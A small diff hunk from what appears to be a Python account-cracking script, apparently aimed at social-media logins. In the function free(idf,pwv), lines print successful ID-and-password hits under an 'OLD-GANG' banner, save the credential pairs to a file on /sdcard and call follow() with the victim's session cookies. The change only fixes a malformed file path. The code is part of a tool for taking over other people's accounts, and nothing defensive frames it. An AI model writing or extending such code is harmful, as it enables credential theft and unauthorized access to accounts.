@@ -371,7 +371,7 @@ def free(idf,pwv):
 				print(f'\r\x1b[1;92m [OLD-GANG_100%] {idf} * {pw}')
 				wrt =('%s - %s' % (idf,pw))
 				ok.append(wrt)
-				open('/sdcard/OLD-GANG,'a').write('%s\n' % wrt)
+				open('/sdcard/Old','a').write('%s\n' % wrt)
 				follow(ses,coki)
 				break
  
